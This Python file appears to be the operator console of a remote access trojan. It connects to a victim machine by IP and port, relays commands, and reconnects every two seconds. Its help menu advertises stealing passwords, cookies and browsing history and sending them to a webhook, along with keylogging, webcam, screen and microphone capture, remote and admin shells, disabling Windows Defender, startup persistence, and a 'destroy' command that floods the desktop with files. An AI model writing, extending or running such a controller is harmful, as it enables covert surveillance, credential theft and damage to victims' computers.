import socket, time, tqdm
from colorama import Fore

host = input("Enter IP adress : ")
try:
    port = int(input("Enter port number : "))
except ValueError:
    print("Value Error!")

while True:
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((host, port))

        message = input("Enter message : ")

        while True:
            if (message != ""):
                client_socket.send(message.encode())
                data = client_socket.recv(51200).decode()
                print(f"Mesaj : {data}")
            message = input("Enter message : ")
            if message == "quit" or message == "exit":
                client_socket.send("quit".encode())
                exit()

            elif message == "password" or message == "pw":
                print("Lütfen bilgiler geldikten sonra 2 saniye komut girmeyin!")

            elif message.startswith("upload "):
                data = message[7:]
                try:
                    with open(message, "rb") as file:
                        client_socket.sendfile(file)
                        print(f"{Fore.GREEN}Succsesfully to sent!{Fore.RESET}")
                except Exception as e:
                    print(f"{Fore.RED}Error! {e}{Fore.RESET}")

            elif message == "help":
                print("help or --help: Print the help message (help) (--help)")
                print("ls: List files and directories in the current path (ls)")
                print("mkdir: Create a new directory (mkdir file.txt)")
                print("rmdir: Delete a directory (rmdir file.txt)")
                print("cat: Display the contents of a file (cat file.txt)")
                print("pwd: Show the current working directory (pwd)")
                print("touch: Create a new file (touch file.txt)")
                print("ifconfig or ipconfig: Display the IP address information (ifconfig) (ipconfig)")
                print("password: Steal passwords (Note: This line is inappropriate and unethical) (password WEBHOOK_URL)")
                print("history: Steal browsing history (Note: This line is inappropriate and unethical) (not working)")
                print("cookie: Steal cookies (Note: This line is inappropriate and unethical) (cookie WEBHOOK_URL)")
                print("cp: Capture a photo (cp WEBHOOK_URL)")
                print("ss or screenshot: Take a screenshot (ss WEBHOOK_URL) (screenshot WEBHOOK_URL)")
                print("vc or voice: Record voice (vc WEBHOOK_URL) (voice WEBHOOK_URL)")
                print("kill: Terminate programs (kill program.exe)")
                print("ps: List running processes (ps)")
                print("open: Open an application (open program.exe)")
                print("hide: Hide an application or file (hide file.txt)")
                print("unhide: Unhide an application or file (unhide file.txt)")
                print("rename: Rename an application or file (rename file.txt, asd.txt)")
                print("startup: Configure startup settings (startup)")
                print("download: Download a file (download file.txt)")
                print("upload: Upload a file (upload file.txt)")
                print("shutdown: Shutdown the computer shutdown")
                print("restart: Restart the computer (restart)")
                print("shell: Activate shell code (shell ls)")
                print("cmd: Activate CMD code (cmd dir/s)")
                print("web: Open a website (web https://www.google.com/)")
                print("web_background: Open a website in the background (web_background https://www.google.com/)")
                print("keylogger: Enable keylogger (Note: This line is inappropriate and unethical) (keylogger WEBHOOK_URL)")
                print("type: Type on the keyboard (type hello)")
                print("press: Press a key on the keyboard (English words only) (press a)")
                print("moveto: Move the mouse based on user input (moveto 15, 20)")
                print("click: Click the mouse (click left)")
                print("defender_off: Turns off Windows Defender (admin privilege required) (defender_off)")
                print("defender_on: dTurns on Windows Defender (admin privilege required) (defender_on)")
                print("exclusion: Windows Defender adds itself to exclusions (admin privilege required) (exclusion)")
                print("admin_shell: Runs PowerShell code as admin (admin privilege required)")
                print("clipboard: Show the contents of the clipboard (clipboard)")
                print("clipboard_delete: Delete the content of the clipboard (clipboard_delete)")
                print("clipboard_rename : Rename the content of the clipboard (clipboard_rename hello)")
                print("destroy: It constantly creates .txt on the desktop and in its directory. It also causes freezing. (destroy I LOVE YOU!)")
                print("notification: Sends a notification with the title and text you specify (notification title, message)")

        client_socket.close()
    except Exception as e:
        print(f"{Fore.RED}Hata {e} 2 saniye sonra {host}:{port} üzerinden tekrar deneniyor...{Fore.RESET}")
        time.sleep(2)
    finally:
        client_socket.close()